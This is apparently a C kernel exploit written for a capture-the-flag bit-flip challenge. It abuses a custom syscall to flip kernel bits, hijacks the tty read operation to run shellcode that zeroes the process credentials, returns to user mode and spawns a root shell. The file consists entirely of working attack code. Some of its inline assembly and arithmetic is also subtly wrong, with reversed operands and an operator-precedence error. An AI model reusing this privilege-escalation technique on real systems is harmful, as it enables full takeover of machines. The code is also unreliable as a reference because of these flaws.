#include <stdio.h>

unsigned long flit_count = 0xffffffff818f4f78;
unsigned long n_tty_ops = 0xffffffff8183e320;
unsigned long n_tty_read = 0xffffffff810c8510;
unsigned long n_tty_ops_read = 0xffffffff8183e320 +0x30;
const unsigned long current_task = 0xffffffff8182e040; 
unsigned long cred = current_task + 0x3c0;
unsigned long user_cs, user_ss, user_sp, user_rflags;

static void save_state()
{
    asm(
    "movq %0, %%cs\n"
    "movq %1, %%ss\n"
    "movq %2, %%rsp\n"
    "pushfq\n"
    "popq %3\n"
    : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags)
    :
    : "memory");
}

void get_shell()
{
    //setreuid(0, 0);
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
}

static void shellcode()
{
    *(unsigned long*)n_tty_ops_read = n_tty_read;
    
    for(int i=0; i<9; i++)
        ((unsigned int*)cred)[i] = 0;
    asm(
        "swapgs\n"
        "mov %%rax, %0\n"
        "push %%rax\n"
        "mov %%rax, %1\n"
        "push %%rax\n"
        "mov %%rax, %2\n"
        "push %%rax\n"
        "mov %%rax, %3\n"
        "push %%rax\n"
        "mov %%rax, %4\n"
        "push %%rax\n"
        "iretq\n"
        :: "r" (user_ss), "r" (user_sp), "r" (user_rflags), "r" (user_cs), "r" (&get_shell)
        : "memory"
    );
}

void flitbip(long * addr, long bit)
{
    /*
    asm(
        "mov rax, 333\n"
        "syscall\n"
    );
    */
    syscall(333, addr, bit);
}

int main()
{
    char buf[0x200];
    unsigned long flipper;
    // save register info
    save_state();
    // overwrite flit_count -> bypass flip count limit
    flitbip((void*)flit_count, 63);
    
    // overwrite read 
    flipper = n_tty_read ^ (unsigned long)shellcode;
    for(int i=0; i<64; i++)
    {
        if(flipper & 1 == 1)
            flitbip(n_tty_ops_read, i);
        flipper >>= 1;
    }
    fgets(buf, sizeof(buf), stdin);
    return 0;

}
